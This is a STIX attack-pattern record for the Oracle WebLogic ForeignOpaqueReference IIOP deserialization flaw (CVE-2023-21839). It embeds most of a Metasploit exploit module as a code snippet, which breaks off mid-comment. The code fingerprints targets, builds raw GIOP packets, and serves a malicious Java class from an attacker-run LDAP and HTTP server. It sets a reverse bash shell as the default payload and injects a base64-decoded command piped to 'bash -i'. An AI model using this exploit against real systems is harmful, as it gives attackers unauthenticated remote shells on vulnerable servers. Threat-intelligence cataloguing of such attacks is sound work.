{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9920a2df-bb8c-4938-84ee-49e23aa6eb60",
    "created": "2024-08-14T17:04:58.98501Z",
    "modified": "2024-08-14T17:04:58.985014Z",
    "name": "Oracle Weblogic PreAuth Remote Command Execution via ForeignOpaqueReference IIOP Deserialization",
    "description": " Oracle Weblogic 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0 prior to the Jan 2023 security update are vulnerable to an unauthenticated remote code execution vulnerability due to a post deserialization vulnerability. This occurs when an attacker serializes a \"ForeignOpaqueReference\" class object, deserializes it on the target, and then post deserialization, calls the object's \"getReferent()\" method, which will make use of the \"ForeignOpaqueReference\" class's \"remoteJNDIName\" variable which is under the attackers control, to do a remote loading of the JNDI address specified by \"remoteJNDIName\" via the \"lookup()\" function.  This can in turn lead to a deserialization vulnerability whereby an attacker supplies the address of a HTTP server hosting a malicious Java class file, which will then be loaded into the Oracle Weblogic process's memory and an attempt to create a new instance of the attacker's class will be made. Attackers can utilize this to execute arbitrary Java code during the instantiation of the object, thereby getting remote code execution as the \"oracle\" user.  This module exploits this vulnerability to trigger the JNDI connection to a LDAP server we control. The LDAP server will then respond with a remote reference response that points to a HTTP server that we control, where the malicious Java class file will be hosted. Oracle Weblogic will then make a HTTP request to retrieve the malicious Java class file at which point our HTTP server will serve up the malicious class file and Oracle Weblogic will instantiate an instance of that class, granting us RCE as the \"oracle\" user.  This vulnerability was exploited in the wild as noted by KEV on May 1st 2023: https://www.fortiguard.com/outbreak-alert/oracle-weblogic-server-vulnerability  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/iiop/cve_2023_21839_weblogic_rce.rb",
            "external_id": "cve_2023_21839_weblogic_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.fortiguard.com/outbreak-alert/oracle-weblogic-server-vulnerability#EITWalert."
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n  include Msf::Exploit::Remote::Tcp\n  include Exploit::Remote::JndiInjection\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  # Page 19 of https://docs.oracle.com/cd/E13211_01/wle/wle42/corba/giop.pdf explains these codes.\n  GIOP_REQUEST = 0\n  GIOP_REPLY = 1\n  GIOP_CANCEL_REQUEST = 2\n  GIOP_LOCATE_REQUEST = 3\n  GIOP_LOCATE_REPLY = 4\n  GIOP_CLOSE_CONNECTION = 5\n  GIOP_MESSAGE_ERROR = 6\n  GIOP_FRAGMENT = 7\n\n  # Taken from page 561 of https://www.omg.org/spec/CORBA/3.0.3/PDF\n  SYNCSCOPE_NONE = 0\n  SYNCSCOPE_WITH_TRANSPORT = 0\n  SYNCSCOPE_WITH_SERVER = 1\n  SYNCSCOPE_WITH_TARGET = 3\n\n  # Taken from page 588 of https://www.omg.org/spec/CORBA/3.0.3/PDF\n  ADDR_DISPOSITION_KEYADDR = 0\n  ADDR_DISPOSITION_PROFILE_ADDR = 1\n  ADDR_DISPOSITION_REFERENCE_ADDR = 2\n\n  # GIOP Protocol RequestReply Header Codes\n  # Type is ReplyStatusType -> Taken from page 24 of https://docs.oracle.com/cd/E13211_01/wle/wle42/corba/giop.pdf\n  NO_EXCEPTION = 0\n  USER_EXCEPTION = 1\n  SYSTEM_EXCEPTION = 2\n  LOCATION_FORWARD = 3\n\n  # GIOP Protocol LocateReply Header Codes\n  # Taken from page 28 of https://docs.oracle.com/cd/E13211_01/wle/wle42/corba/giop.pdf\n  UNKNOWN_OBJECT = 0\n  OBJECT_HERE = 1\n  OBJECT_FORWARD = 2\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Oracle Weblogic PreAuth Remote Command Execution via ForeignOpaqueReference IIOP Deserialization',\n        'License' => MSF_LICENSE,\n        'Author' => [\n          '4ra1n', # From X-Ray Security Team of Chaitin Tech. The researcher who originally found this vulnerability and wrote the PoC.\n          '14m3ta7k', # Of gobysec team. Wrote the writeup and analysis of this vulnerability.\n          'Grant Willcox' # @tekwizz123 This Metasploit module\n        ],\n        'Description' => %q{\n          Oracle Weblogic 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0 prior to the Jan 2023 security update are vulnerable to an unauthenticated\n          remote code execution vulnerability due to a post deserialization vulnerability. This occurs when an attacker serializes\n          a \"ForeignOpaqueReference\" class object, deserializes it on the target, and then post deserialization, calls the\n          object's \"getReferent()\" method, which will make use of the \"ForeignOpaqueReference\" class's \"remoteJNDIName\" variable,\n          which is under the attackers control, to do a remote loading of the JNDI address specified by \"remoteJNDIName\" via\n          the \"lookup()\" function.\n\n          This can in turn lead to a deserialization vulnerability whereby an attacker supplies the address of a HTTP server hosting\n          a malicious Java class file, which will then be loaded into the Oracle Weblogic process's memory and an attempt to\n          create a new instance of the attacker's class will be made. Attackers can utilize this to execute arbitrary Java\n          code during the instantiation of the object, thereby getting remote code execution as the \"oracle\" user.\n\n          This module exploits this vulnerability to trigger the JNDI connection to a LDAP server we control. The LDAP server will\n          then respond with a remote reference response that points to a HTTP server that we control, where the malicious Java\n          class file will be hosted. Oracle Weblogic will then make a HTTP request to retrieve the malicious Java class file,\n          at which point our HTTP server will serve up the malicious class file and Oracle Weblogic will instantiate\n          an instance of that class, granting us RCE as the \"oracle\" user.\n\n          This vulnerability was exploited in the wild as noted by KEV on May 1st 2023: https://www.fortiguard.com/outbreak-alert/oracle-weblogic-server-vulnerability\n        },\n        'References' => [\n          ['CVE', '2023-21839'],\n          ['URL', 'https://www.oracle.com/security-alerts/cpujan2023.html'], # Advisory\n          ['URL', 'https://github.com/gobysec/Weblogic/blob/main/WebLogic_CVE-2023-21931_en_US.md'], # Writeup\n          ['URL', 'https://github.com/gobysec/Weblogic/blob/main/Weblogic_Serialization_Vulnerability_and_IIOP_Protocol_en_US.md'], # Additional Info on Weblogic and IIOP\n          ['URL', 'https://github.com/4ra1n/CVE-2023-21839'], # PoC\n          ['URL', 'https://www.fortiguard.com/outbreak-alert/oracle-weblogic-server-vulnerability'] # EITW alert.\n        ],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Linux', {\n              'Platform' => %w[unix linux],\n              'Arch' => [ARCH_CMD],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_bash'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2023-01-17',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(7001),\n        OptPort.new('HTTP_SRVPORT', [true, 'The HTTP server port', 8080])\n      ]\n    )\n  end\n\n  def get_weblogic_version\n    socket = connect\n    http_request = Rex::Proto::Http::ClientRequest.new(\n      {\n        'uri' => '/console/login/LoginForm.jsp',\n        'vhost' => datastore['RHOST'],\n        'port' => datastore['RPORT']\n      }\n    ).to_s\n    socket.put(http_request.to_s)\n    res = socket.get\n    fail_with(Failure::UnexpectedReply, 'Could not get the Weblogic login page') unless res\n\n    # Disconnect as we will want a new socket for future connections.\n    disconnect\n\n    # Do the regex on the result to find the version.\n    version = res.match(/WebLogic Server Version: ((?:\\d{1,3}\\.){4}\\d{1,3})/)\n    fail_with(Failure::UnexpectedReply, 'Could not get the version information from the Weblogic login page') if version.nil?\n    version = version[1]\n\n    Rex::Version.new(version)\n  end\n\n  def giop_header(msg_type)\n    header = ''\n    header << 'GIOP' # Magic\n    header << \"\\x01\\x02\" # Version, in this case 1.2 of the GIOP protocol.\n    header << \"\\x00\" # Message flags\n    case msg_type\n    when GIOP_REQUEST, GIOP_CANCEL_REQUEST, GIOP_LOCATE_REQUEST, GIOP_MESSAGE_ERROR, GIOP_FRAGMENT\n      header << [msg_type].pack('C')\n    else\n      fail_with(Failure::BadConfig, 'Attempt was made to send a packet with an invalid GIOP header!')\n    end\n    header << 'LENGTH_REPLACE_ME'\n  end\n\n  # LocateRequest packets are used to determine whether an object reference is valid,\n  # whether the current server is capable of directly receiving request for the object reference,\n  # and if not, to what address the request for the object should be sent.\n  #\n  # Taken from https://docs.oracle.com/cd/E13211_01/wle/wle42/corba/giop.pdf page 27\n  def giop_locate_request_packet(keyaddress = 'NameService')\n    header = giop_header(GIOP_LOCATE_REQUEST) # GIOP Header with LocateRequest attribute\n    data = ''\n    packet = ''\n\n    @request_id = 1 if @request_id.nil?\n    @request_id += 1\n    data << [@request_id].pack('N') # Request ID\n    data << [0].pack('n') # TargetAddress, 2 byte field\n    data << [0].pack('n') # Padding, 2 bytes\n    data << [keyaddress.length].pack('N') # Key Address Length\n    data << keyaddress\n\n    packet << header\n    packet << data\n    packet.gsub!('LENGTH_REPLACE_ME', [data.length].pack('N'))\n\n    packet\n  end\n\n  def create_service_context(vscid, scid, context_data, endian = 0)\n    context = ''\n    seq_length = context_data.length + 1 # Add 1 to account for the endian byte being part of the sequence length.\n    context << vscid # 3 byte long VSCID\n    context << [scid].pack('C') # 1 byte long SCID\n    context << [seq_length].pack('N') # 4 byte long sequence length\n    context << [endian].pack('C') # 1 byte indicator of endianness. 0 is big endian, 1 is little endian.\n    context << context_data\n\n    context\n  end\n\n  def giop_rebind_any_packet(sync_scope, addr_disposition, key_address, stub_data, context_list_length)\n    header = giop_header(GIOP_REQUEST) # GIOP Header with REQUEST attribute\n    data = ''\n    packet = ''\n\n    @request_id = 1 if @request_id.nil?\n    @request_id += 1\n    data << [@request_id].pack('N') # Request ID\n    data << [sync_scope].pack('C') # Response flags\n    data << \"\\x00\\x00\\x00\" # Reserved\n    data << [addr_disposition].pack('n') # TargetAddress, 2 bytes\n    data << [0].pack('n') # Two bytes of padding.\n    data << [key_address.length].pack('N') # Key Address Length\n    data << key_address\n    data << [11].pack('N') # Operation Length + 1 for a NULL byte to terminate the operation name?\n    data << \"rebind_any\\x00\" # Request Operation\n\n    service_context_list = ''\n    service_context_list << \"\\x00\" # Seems we have one byte of padding? Lets account for this.\n    service_context_list << [context_list_length].pack('N') # Sequence Length\n    service_context_list << '{SERVICE_CONTEXT_LIST}'\n\n    @java_class_name = 'PayloadRuns'\n    ldap_uri = jndi_string(@java_class_name)\n    stub_data += [ldap_uri.length].pack('C') + ldap_uri\n\n    data << service_context_list\n    data << stub_data\n\n    packet << header\n    packet << data\n\n    packet\n  end\n\n  def goip_resolve_request_packet(sync_scope, addr_disposition, key_address, context_list_length, cos_naming_disector, seq_len)\n    header = giop_header(GIOP_REQUEST) # GIOP Header with REQUEST attribute\n    data = ''\n    packet = ''\n\n    @request_id = 1 if @request_id.nil?\n    @request_id += 1\n    data << [@request_id].pack('N') # Request ID\n    data << [sync_scope].pack('C') # Response flags\n    data << \"\\x00\\x00\\x00\" # Reserved\n    data << [addr_disposition].pack('n') # TargetAddress, 2 bytes\n    data << [0].pack('n') # Two bytes of padding.\n    data << [key_address.length].pack('N') # Key Address Length\n    data << key_address\n    data << [8].pack('N') # Operation Length + 1 for a NULL byte to terminate the operation name?\n    data << \"resolve\\x00\" # Request Operation\n\n    service_context_list = ''\n    service_context_list << [context_list_length].pack('N') # Sequence Length\n    service_context_list << '{SERVICE_CONTEXT_LIST}'\n\n    cos_data = ''\n    if cos_naming_disector\n      cos_data << \"\\x00\\x00\\x00\\x00\"\n      cos_data << [seq_len].pack('N') # Sequence length\n      name_component = \"test\\x00\"\n      cos_data << [name_component.length].pack('N') # Name component length including NULL byte.\n      cos_data << name_component\n      cos_data << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\" # Unknown data, Wireshark could not decode this.\n    end\n\n    data << service_context_list\n    data << cos_data\n\n    packet << header\n    packet << data\n\n    packet\n  end\n\n  def check\n    begin\n      @version = get_weblogic_version\n      fail_with(Failure::UnexpectedReply, 'Could not find the target Weblogic version in the t3 response!') if @version.nil?\n    rescue ::Timeout::Error\n      fail_with(Failure::TimeoutExpired, 'Was unable to connect to target. Connection timed out.')\n    rescue Rex::AddressInUse\n      fail_with(Failure::BadConfig, 'Address is currently in use')\n    rescue Rex::HostUnreachable\n      fail_with(Failure::Unreachable, 'Target host is unreachable!')\n    rescue Rex::ConnectionRefused\n      fail_with(Failure::Disconnected, 'Target refused connection!')\n    rescue ::Errno::ETIMEDOUT, Rex::ConnectionTimeout\n      fail_with(Failure::TimeoutExpired, 'Was unable to connect to target. Connection timed out.')\n    end\n\n    if @version.between?(Rex::Version.new('12.2.1.3.0'), Rex::Version.new('12.2.1.3.9999'))\n      return CheckCode::Vulnerable('Target is a Oracle WebServer 12.2.1.3 server, and is vulnerable!')\n    elsif @version.between?(Rex::Version.new('12.2.1.4.0'), Rex::Version.new('12.2.1.4.9999'))\n      return CheckCode::Vulnerable('Target is a Oracle WebServer 12.2.1.4 server, and is vulnerable!')\n    elsif @version.between?(Rex::Version.new('14.1.1.0.0'), Rex::Version.new('14.1.1.0.9999'))\n      return CheckCode::Vulnerable('Target is a Oracle WebServer 14.1.1.0 server, and is vulnerable!')\n    else\n      return CheckCode::Safe('Target is not a vulnerable version of Oracle WebServer!')\n    end\n  end\n\n  # HTTP Server Related Functions and Overrides\n\n  # Returns the configured URIPATH along with the path to the Java class we are serving\n  def resource_uri\n    \"#{datastore['URIPATH']}/#{@java_class_name}.class\"\n  end\n\n  # Want to just point this to the base of our install. WebLogic will append *CLASS NAME*.class to the end of\n  # this URL when it tries to fetch the class to be loaded and instantiated.\n  def ldap_url_string\n    \"http#{datastore['SSL'] ? 's' : ''}://#{Rex::Socket.to_authority(datastore['SRVHOST'], datastore['HTTP_SRVPORT'])}/\"\n  end\n\n  #\n  # Handle the HTTP request and return a response.  Code borrowed from:\n  # msf/core/exploit/http/server.rb\n  #\n  def start_http_service(opts = {})\n    # Start a new HTTP server\n    @http_service = Rex::ServiceManager.start(\n      Rex::Proto::Http::Server,\n      (opts['ServerPort'] || bindport).to_i,\n      opts['ServerHost'] || bindhost,\n      datastore['SSL'],\n      {\n        'Msf' => framework,\n        'MsfExploit' => self\n      },\n      opts['Comm'] || _determine_server_comm(opts['ServerHost'] || bindhost),\n      datastore['SSLCert'],\n      datastore['SSLCompression'],\n      datastore['SSLCipher'],\n      datastore['SSLVersion']\n    )\n    @http_service.server_name = datastore['HTTP::server_name']\n    # Default the procedure of the URI to on_request_uri if one isn't\n    # provided.\n    uopts = {\n      'Proc' => method(:on_request_uri),\n      'Path' => resource_uri\n    }.update(opts['Uri'] || {})\n    proto = (datastore['SSL'] ? 'https' : 'http')\n\n    netloc = opts['ServerHost'] || bindhost\n    http_srvport = (opts['ServerPort'] || bindport).to_i\n    print_status(\"Serving Java code on: #{proto}://#{Rex::Socket.to_authority(netloc, http_srvport)}#{uopts['Path']}\")\n\n    # Add path to resource\n    @service_path = uopts['Path']\n    @http_service.add_resource(uopts['Path'], uopts)\n  end\n\n  #\n  # Kill HTTP service (shut it down and clear resources)\n  #\n  def cleanup\n    # Stop the LDAP server\n    cleanup_service\n\n    # Clean and stop HTTP server\n    if @http_service\n      begin\n        @http_service.remove_resource(datastore['URIPATH'])\n        @http_service.deref\n        @http_service.stop\n        @http_service = nil\n      rescue StandardError => e\n        print_error(\"Failed to stop http server due to #{e}\")\n      end\n    end\n    super\n  end\n\n  #\n  # Handle HTTP requests and responses\n  #\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n    vprint_good(\"Payload requested by #{cli.peerhost} using #{agent}\")\n    class_raw = File.binread(File.join(Msf::Config.data_directory, 'exploits', 'CVE-2023-21839', 'PayloadRuns.class'))\n    base64_payload = Rex::Text.encode_base64(payload.encoded)\n    exec_command_length = 'bash -c {echo,PAYLOAD}|{base64,-d}|{bash,-i}'.length\n    command_length = (exec_command_length - 'PAYLOAD'.length) + base64_payload.length\n    class_raw = class_raw.gsub(\"\\x00\\x2C\", [command_length].pack('n'))\n    class_raw = class_raw.gsub('PAYLOAD', base64_payload)\n    send_response(cli, 200, 'OK', class_raw)\n  end\n\n  #\n  # Create an HTTP response and then send it\n  #\n  def send_response(cli, code, message = 'OK', html = '')\n    proto = Rex::Proto::Http::DefaultProtocol\n    res = Rex::Proto::Http::Response.new(code, message, proto)\n    res.body = html\n    cli.send_response(res)\n  end\n\n  # LDAP Server Overrides\n  def build_ldap_search_response_payload\n    # Always do a remote load\n    # Note that for reasons unknown this URL cannot be anything but the base URL of the HTTP server.\n    # You can add anchor tags using # to the URL but thats it.\n    build_ldap_search_response_payload_remote(ldap_url_string, @java_class_name)\n  end\n\n  # Main Exploit\n  def exploit\n    if Rex::Socket.is_ip_addr?(datastore['SRVHOST']) && Rex::Socket.addr_atoi(datastore['SRVHOST']) == 0\n      fail_with(Failure::BadConfig, 'SRVHOST must be set to a routable address!')\n    end\n\n    if @version.blank?\n      @version = get_weblogic_version\n    end\n\n    # Step 1 - Make T3 connection to start IIOP connection process, and read response.\n    socket = connect\n    print_status('1. Making T3 connection...')\n    socket.put(\"t3 9.2.0.0\\nAS:255\\nHL:92\\nMS:10000000\\nPU:t3://#{Rex::Socket.to_authority(datastore['RHOST'], datastore['RPORT'])}\\n\\n\")\n    _buf = socket.get\n    disconnect\n    print_good('Made T3 connection!')\n\n    # Step 2 - Send first GIOP LocateRequest packet\n    print_status('2. Sending first GIOP LocateRequest packet')\n    # Make a GIOP LocateRequest packet request and read response.\n    socket = connect\n    socket.put(giop_locate_request_packet)\n    locate_buf = socket.get\n    disconnect\n    print_good('Step 2 complete!')\n\n    reply_status = locate_buf[16..19].unpack('N')&.dig(0)\n    if reply_status != OBJECT_FORWARD\n      fail_with(Failure::UnexpectedReply, 'Target did not respond with the expected OBJECT_FORWARD response to our GIOP LocateRequest packet!')\n    end\n\n    # Calculate the target port\n\n    # Start at offset 0x60 which will be inside the GIOP's LocateReply message,\n    # and will be where the IP address is located in the IOR response.\n    port_offset = 0x60\n\n    # Starting at this offset above, loop until we hit a zero byte in the IOR buffer.\n    # This works because the PORT number is represented as a 4 byte long number, aka 32 bits,\n    # and the upper part will never be used. Either that or there is a \\x00\\x00 padding section\n    # between the IP address and the port.\n    loop do\n      if locate_buf[port_offset] != \"\\x00\"\n        port_offset += 0x1\n      else\n        break\n      end\n    end\n\n    # If port_offset is too large by this point then we have likely hit an error and should exit\n    if port_offset > 10240\n      fail_with(Failure::UnexpectedReply, 'Response from server when calculating port_offset was malformed!')\n    end\n\n    # Now, loop until we hit a non-zero byte in the IOR buffer. This should\n    # place at the location of the port part of the IP address that is embedded in the IOR message.\n    loop do\n      if locate_buf[port_offset] == \"\\x00\"\n        port_offset += 0x1\n      else\n        break\n      end\n    end\n\n    port = []\n    port.append(locate_buf[port_offset])\n    port_offset += 1\n    port.append(locate_buf[port_offset])\n\n    # Reformulate the port number from the array so we can get the actual port the target server is expecting us to use.\n    final_port = port[1].bytes[0] | (port[0].bytes[0] << 8)\n\n    # Fail if the received port is not the one we expected.\n    if final_port != datastore['RPORT']\n      fail_with(Failure::UnexpectedReply, \"Target did not respond with the same RPORT in the GIOP LocateReply message as the one we expected. Expected #{datastore['RPORT']} but got #{final_port}\")\n    end\n\n    lt = port_offset - 0x60 # This will point us 1 byte into the request ID field of the GIOP LocateReply message.\n    foff = 0x60 + lt + 0x75 # This points us at some point within the IOR object that is just before the bytes \u0000\u0000V~QU5z\ufffdU\u0000\n\n    loop do\n      if locate_buf[foff] == \"\\x00\"\n        foff += 0x1\n      else\n        break\n      end\n    end\n\n    key1 = locate_buf[foff...foff + 8]\n    key2 = \"\\xff\\xff\\xff\\xff\" + locate_buf[foff + 4...foff + 8]\n\n    if @version >= Rex::Version.new('12') && @version < Rex::Version.new('13')\n      wls_key_1 = \"\\x00\\x42\\x45\\x41\\x08\\x01\\x03\\x00\\x00\\x00\\x00\\x0c\\x41\\x64\\x6d\\x69\\x6e\\x53\\x65\\x72\\x76\\x65\\x72\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x33\\x49\" \\\n                  \"\\x44\\x4c\\x3a\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2f\\x63\\x6f\\x72\\x62\\x61\\x2f\\x63\\x6f\\x73\\x2f\\x6e\\x61\\x6d\\x69\\x6e\\x67\\x2f\\x4e\\x61\\x6d\\x69\\x6e\\x67\\x43\" \\\n                  \"\\x6f\\x6e\\x74\\x65\\x78\\x74\\x41\\x6e\\x79\\x3a\\x31\\x2e\\x30\\x00\\x00\\x00\\x00\\x00\\x02\\x38\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x42\\x45\\x41\\x2c\\x00\\x00\\x00\\x10\\x00\" \\\n                  \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00{{key1}}\"\n      wls_key_2 = \"\\x00\\x42\\x45\\x41\\x08\\x01\\x03\\x00\\x00\\x00\\x00\\x0c\\x41\\x64\\x6d\\x69\\x6e\\x53\\x65\\x72\\x76\\x65\\x72\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x33\\x49\" \\\n                  \"\\x44\\x4c\\x3a\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2f\\x63\\x6f\\x72\\x62\\x61\\x2f\\x63\\x6f\\x73\\x2f\\x6e\\x61\\x6d\\x69\\x6e\\x67\\x2f\\x4e\\x61\\x6d\\x69\\x6e\\x67\\x43\" \\\n                  \"\\x6f\\x6e\\x74\\x65\\x78\\x74\\x41\\x6e\\x79\\x3a\\x31\\x2e\\x30\\x00\\x00\\x00\\x00\\x00\\x04{{key3}}\\x00\\x00\\x00\\x01\\x42\\x45\\x41\\x2c\\x00\\x00\\x00\\x10\\x00\" \\\n                  \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00{{key1}}\"\n    elsif @version >= Rex::Version.new('14') && @version < Rex::Version.new('15')\n      wls_key_1 = \"\\x00\\x42\\x45\\x41\\x08\\x01\\x03\\x00\\x00\\x00\\x00\\x0c\\x41\\x64\" \\\n                  \"\\x6d\\x69\\x6e\\x53\\x65\\x72\\x76\\x65\\x72\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x33\\x49\\x44\\x4c\\x3a\\x77\\x65\\x62\\x6c\" \\\n                  \"\\x6f\\x67\\x69\\x63\\x2f\\x63\\x6f\\x72\\x62\\x61\\x2f\\x63\\x6f\\x73\\x2f\\x6e\\x61\\x6d\\x69\\x6e\\x67\\x2f\\x4e\\x61\\x6d\" \\\n                  \"\\x69\\x6e\\x67\\x43\\x6f\\x6e\\x74\\x65\\x78\\x74\\x41\\x6e\\x79\\x3a\\x31\\x2e\\x30\\x00\\x00\\x00\\x00\\x00\\x02\\x38\\x00\\x00\" \\\n                  \"\\x00\\x00\\x00\\x00\\x01\\x42\\x45\\x41\\x2e\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00{{key1}}\"\n      wls_key_2 = \"\\x00\\x42\\x45\\x41\\x08\\x01\\x03\\x00\\x00\\x00\\x00\\x0c\\x41\\x64\\x6d\\x69\\x6e\\x53\\x65\\x72\\x76\\x65\" \\\n                  \"\\x72\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x33\\x49\\x44\\x4c\\x3a\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2f\\x63\\x6f\\x72\" \\\n                  \"\\x62\\x61\\x2f\\x63\\x6f\\x73\\x2f\\x6e\\x61\\x6d\\x69\\x6e\\x67\\x2f\\x4e\\x61\\x6d\\x69\\x6e\\x67\\x43\\x6f\\x6e\\x74\\x65\" \\\n                  \"\\x78\\x74\\x41\\x6e\\x79\\x3a\\x31\\x2e\\x30\\x00\\x00\\x00\\x00\\x00\\x04{{key3}}\\x00\\x00\\x00\\x01\\x42\\x45\\x41\" \\\n                  \"\\x2e\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00{{key1}}\"\n    else\n      fail_with(Failure::NoTarget, 'Target is not running a supported version of Oracle Weblogic that can be targeted!')\n    end\n\n    wls_key_1.gsub!('{{key1}}', key1)\n\n    # Step 3 - Make a rebindAny request\n    key_addr = wls_key_1\n    stub_data = \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x04\\x74\\x65\\x73\\x74\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1d\\x00\\x00\\x00\\x1c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\" \\\n                \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x7f\\xff\\xff\\x02\\x00\\x00\\x00\\x54\\x52\\x4d\\x49\\x3a\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x6a\\x6e\\x64\\x69\\x2e\\x69\" \\\n                \"\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x46\\x6f\\x72\\x65\\x69\\x67\\x6e\\x4f\\x70\\x61\\x71\\x75\\x65\\x52\\x65\\x66\\x65\\x72\\x65\\x6e\\x63\\x65\\x3a\\x44\\x32\\x33\\x37\\x44\\x39\\x31\\x43\\x42\\x32\\x46\\x30\\x46\\x36\\x38\" \\\n                \"\\x41\\x3a\\x33\\x44\\x32\\x31\\x35\\x32\\x37\\x46\\x45\\x44\\x35\\x39\\x36\\x45\\x46\\x31\\x00\\x00\\x00\\x00\\x00\\x7f\\xff\\xff\\x02\\x00\\x00\\x00\\x23\\x49\\x44\\x4c\\x3a\\x6f\\x6d\\x67\\x2e\\x6f\\x72\\x67\\x2f\\x43\\x4f\\x52\\x42\" \\\n                \"\\x41\\x2f\\x57\\x53\\x74\\x72\\x69\\x6e\\x67\\x56\\x61\\x6c\\x75\\x65\\x3a\\x31\\x2e\\x30\\x00\\x00\\x00\\x00\\x00\"\n    socket = connect\n    packet = giop_rebind_any_packet(SYNCSCOPE_WITH_TARGET, ADDR_DISPOSITION_KEYADDR, key_addr, \"\\x00\\x00\\x00\\x00\" + stub_data, 6)\n\n    context_data = ''\n    @service_context_0 = create_service_context(\"\\x00\\x00\\x00\", 5, \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x0d\\x31\\x37\\x32\\x2e\\x32\\x36\\x2e\\x31\\x31\\x32\\x2e\\x31\\x00\\x00\\xec\\x5b\")\n    @service_context_1 = create_service_context(\"\\x00\\x00\\x00\", 1, \"\\x00\\x00\\x00\\x00\\x01\\x00\\x20\\x05\\x01\\x00\\x01\")\n    @service_context_2 = create_service_context(\"\\x42\\x45\\x41\", 0, \"\\x0a\\x03\\x01\")\n\n    context_data << @service_context_0\n    context_data << @service_context_1\n    context_data << create_service_context(\"\\x00\\x00\\x00\", 6, \"\\x00\\x00\\x00\\x00\\x00\\x00\\x28\\x49\\x44\\x4c\\x3a\\x6f\\x6d\\x67\\x2e\\x6f\\x72\\x67\\x2f\\x53\\x65\\x6e\\x64\\x69\\x6e\\x67\\x43\" \\\n      \"\\x6f\\x6e\\x74\\x65\\x78\\x74\\x2f\\x43\\x6f\\x64\\x65\\x42\\x61\\x73\\x65\\x3a\\x31\\x2e\\x30\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xb8\\x00\\x01\\x02\\x00\\x00\\x00\\x00\" \\\n      \"\\x0d\\x31\\x37\\x32\\x2e\\x32\\x36\\x2e\\x31\\x31\\x32\\x2e\\x31\\x00\\x00\\xec\\x5b\\x00\\x00\\x00\\x64\\x00\\x42\\x45\\x41\\x08\\x01\\x03\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n      \"\\x00\\x00\\x00\\x00\\x00\\x28\\x49\\x44\\x4c\\x3a\\x6f\\x6d\\x67\\x2e\\x6f\\x72\\x67\\x2f\\x53\\x65\\x6e\\x64\\x69\\x6e\\x67\\x43\\x6f\\x6e\\x74\\x65\\x78\\x74\\x2f\\x43\\x6f\\x64\\x65\\x42\\x61\" \\\n      \"\\x73\\x65\\x3a\\x31\\x2e\\x30\\x00\\x00\\x00\\x00\\x03\\x31\\x32\\x00\\x00\\x00\\x00\\x00\\x01\\x42\\x45\\x41\\x2a\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x5e\\xed\\xaf\\xde\" \\\n      \"\\xbc\\x0d\\x22\\x70\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x2c\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x20\\x00\\x00\\x00\\x03\\x00\\x01\\x00\\x20\\x00\\x01\\x00\\x01\\x05\\x01\\x00\" \\\n      \"\\x01\\x00\\x01\\x01\\x00\\x00\\x00\\x00\\x03\\x00\\x01\\x01\\x00\\x00\\x01\\x01\\x09\\x05\\x01\\x00\\x01\")\n    context_data << create_service_context(\"\\x00\\x00\\x00\", 15, \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\")\n    context_data << create_service_context(\"\\x42\\x45\\x41\", 3, \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" + key2 + \"\\x00\\x00\\x00\\x00\")\n    context_data << @service_context_2\n\n    packet.gsub!('{SERVICE_CONTEXT_LIST}', context_data)\n\n    # To find the true message size:\n    # 1. Subtract an extra 12 bytes for GIOP header.\n    # 2. 